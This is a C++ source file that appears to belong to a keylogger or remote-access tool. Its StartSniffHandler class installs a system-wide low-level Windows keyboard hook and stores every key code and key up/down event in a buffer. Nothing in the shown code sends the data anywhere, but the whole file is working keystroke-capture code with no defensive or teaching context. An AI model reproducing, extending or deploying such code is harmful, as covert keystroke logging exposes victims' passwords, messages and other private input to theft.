#include "StartSniffHandler.hpp"

#include "KeyboardEvent.hpp"
#include "Processes/ActiveWindowsHook.hpp"
#include "Processes/WindowsHook.hpp"

void StartSniffHandler::run()
{
	ActiveWindowsHook::register_hook(
		WindowsHook::Type::KEYBOARD,
		[this](const int action_type, const WPARAM message_type, const LPARAM message_data)
		{
			callback(action_type, message_type, message_data);
		}
	);
}

void StartSniffHandler::callback(const int action_type, const WPARAM message_type, const LPARAM message_data)
{
	static constexpr int KEYBOARD_ACTION = 0;
	if (action_type != KEYBOARD_ACTION)
	{
		return;
	}

	const auto data = reinterpret_cast<const KBDLLHOOKSTRUCT*>(message_data);

	const uint32_t key_code = data->vkCode;
	const KeyboardEvent::Type event_type = (message_type == WM_KEYDOWN || message_type == WM_SYSKEYDOWN)
		                                       ? KeyboardEvent::Type::DOWN
		                                       : KeyboardEvent::Type::UP;

	m_keys.push_back(KeyboardEvent{.type = event_type, .key_code = key_code});
}
